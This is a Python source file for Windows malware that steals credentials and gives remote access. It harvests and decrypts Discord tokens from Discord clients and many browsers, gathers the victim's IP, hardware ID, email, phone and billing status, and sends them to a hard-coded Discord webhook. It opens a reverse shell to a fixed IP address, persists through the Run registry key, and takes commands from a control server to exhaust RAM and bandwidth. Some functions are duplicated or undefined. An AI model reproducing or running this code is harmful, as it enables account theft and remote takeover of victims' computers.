try:
    import os
    import requests
    import subprocess
    import time
    import threading
    import winreg
    from re import findall
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from threading import Thread
    from sys import argv
    import asyncio
    from Crypto.Cipher import AES
    import httpx
    import json
    import socket
except:
    import time
    import os
    import sys
    input("Found missing modules. Press enter to install them.")
    print("Installing missing modules in 3 seconds. CTRL + C to cancel.")
    time.sleep(3.0)
    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install PIL-tools && pip install colorama && pip install win10toast")
    os.system("cls")
    print("Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds.")
    time.sleep(10)
    sys.exit

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
CONTROL_SERVER = "https://api.zitemaker.epicgamer.org"
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []

def debug(message):
    print(f"[DEBUG] {message}")


def connect_to_server(host='140.245.13.186', port=4444):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((host, port))
        print(f"[+] Connected to {host}:{port}")

        while True:
            command = client_socket.recv(4096).decode().strip()

            if command.lower() in ["exit", "quit"]:
                break

            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    response = f"Changed directory to: {os.getcwd()}\n"
                except Exception as e:
                    response = str(e) + "\n"

            else:
                try:
                    process = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        text=True
                    )

                    stdout, stderr = process.communicate()
                    response = stdout + stderr
                    response += f"\nCommand exited with code: {process.returncode}\n"

                except Exception as e:
                    response = str(e) + "\n"

            client_socket.send(response.encode())

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    connect_to_server()


# RAM Consumption
def eat_ram():
    debug("Starting RAM consumption...")
    try:
        x = []
        while True:
            x.append(bytearray(50000000))
            time.sleep(0.5)
    except MemoryError:
        debug("RAM consumption stopped due to memory error.")
    except Exception as e:
        debug(f"Error in eat_ram: {e}")

# Bandwidth Consumption
def eat_bandwidth():
    debug("Starting bandwidth consumption...")
    while True:
        try:
            requests.get("http://speed.hetzner.de/1GB.bin")
        except Exception as e:
            debug(f"Error in eat_bandwidth: {e}")
        time.sleep(1)

# Add to Startup
def add_to_startup():
    debug("Adding to startup...")
    try:
        script_path = os.path.abspath(__file__)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "MyApp", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry_key)
        debug("Added to startup successfully.")
    except Exception as e:
        debug(f"Error adding to startup: {e}")

# Command Listener
def listen_for_commands():
    debug("Starting command listener...")
    while True:
        try:
            response = requests.get(f"{CONTROL_SERVER}/command").json()
            command = response.get("command")
            if command and isinstance(command, str):
                debug(f"Received command: {command}")
                if command == "ram":
                    try:
                        threading.Thread(target=eat_ram).start()
                    except Exception as e:
                        debug(f"Error starting RAM thread: {e}")
                elif command == "bandwidth":
                    try:
                        threading.Thread(target=eat_bandwidth).start()
                    except Exception as e:
                        debug(f"Error starting bandwidth thread: {e}")
                elif command == "rdp":
                    start_rdp_tunnel()
                else:
                    debug(f"Unknown command: {command}")
            else:
                debug("Received empty or invalid command.")
        except Exception as e:
            debug(f"Error in listen_for_commands: {e}")
        time.sleep(5)

# Discord Token Grabber
def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token)))
        if response.getcode() == 200:
            return loads(response.read().decode())
        else:
            debug(f"Invalid token: {token}")
            return None
    except Exception as e:
        debug(f"Error getting user data: {e}")
        return None

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}") :
                    for token in findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        debug(f"Error getting tokens: {e}")
    return tokens

def whoTheFuckAmI():
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        debug(f"IP address: {ip}")
        return ip
    except Exception as e:
        debug(f"Error getting IP: {e}")
        return "None"

def hWiD():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        debug(f"HWID: {hwid}")
        return hwid
    except Exception as e:
        debug(f"Error getting HWID: {e}")
        return "None"

def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

@staticmethod
def get_master_key(path) -> str:
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key        


@staticmethod
def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"



def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

async def checkToken(tkn: str) -> str:
        try:
            r = httpx.get(
                url=baseurl,
                headers=getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in tokens:
            tokens.append(tkn)


@staticmethod
def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"


def send_token_to_webhook(token):
    """Send the token via webhook"""
    payload = {
        "content": f"New Discord Token: {token}"
    }
    try:
        response = requests.post(WEBHOOK_URL, data=payload)
        if response.status_code == 204:
            print(f"Token sent successfully: {token}")
        else:
            print(f"Failed to send token, status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending token to webhook: {e}")

@try_extract
def grabTokens():
        paths = {
            'Discord': ROAMING + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': ROAMING + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': ROAMING + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': ROAMING + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': ROAMING + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': ROAMING + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': LOCAL + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': LOCAL + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': LOCAL + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': LOCAL + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': LOCAL + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': LOCAL + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': LOCAL + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': LOCAL + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': LOCAL + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': LOCAL + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': LOCAL + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': LOCAL + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': LOCAL + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': LOCAL + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': LOCAL + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': LOCAL + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(ROAMING+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(encrypted_regex, line):
                                token = decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), get_master_key(ROAMING+f'\\{disc}\\Local State'))
                                asyncio.run(checkToken(token))
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(regex, line):
                            asyncio.run(checkToken(token))

        if os.path.exists(ROAMING+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(ROAMING+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(regex, line):
                            asyncio.run(checkToken(token))



def main():
    debug("Starting main function...")
    cache_path = ROAMING + "\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI() 
    pc_username = os.getenv("UserName") 
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path): 
            if token in checked:
                continue
            checked.append(token)
            uid = None


            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue


            user_data = getUserData(token)
            if not user_data:
                debug(f"Invalid token or failed to get user data for token: {token}")
                user_data = None 

            working_ids.append(uid)
            working.append(token)


            username = user_data["username"] + "#" + str(user_data["discriminator"]) if user_data else "N/A"
            user_id = user_data["id"] if user_data else "N/A"
            email = user_data.get("email") if user_data else "N/A"
            phone = user_data.get("phone") if user_data else "N/A"
            nitro = bool(user_data.get("premium_type")) if user_data else False
            billing = bool(paymentMethods(token)) if user_data else False


            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
                        "inline": True
                    },
                    {
                        "name": "|More Info|",
                        "value": f"HWID: {hWiD()}\nToken: {token}",
                        "inline": False
                    },
                    {
                        'name': '**Tokens:**',
                        'value': f'''```yaml
                        {tokens if tokens else "No tokens extracted"}```
                        '''.replace(' ', ''),
                        'inline': False
                        }
                ],
                "author": {"name": username, "icon_url": "https://cdn.discordapp.com/avatars/" + str(user_id) + ".png?size=32"},
                "footer": {"text": "Zitemaker"}
            }

            embeds.append(embed)


    data = {
        "embeds": embeds
    }

    try:
        requests.post(WEBHOOK_URL, json=data)
        debug("Data sent to webhook successfully.")
    except Exception as e:
        debug(f"Error sending data to webhook: {e}")

if __name__ == "__main__":
    main()
    connect_to_server()
    main_thread = threading.Thread(target=listen_for_commands)
    main_thread.start()
    main_thread.join()
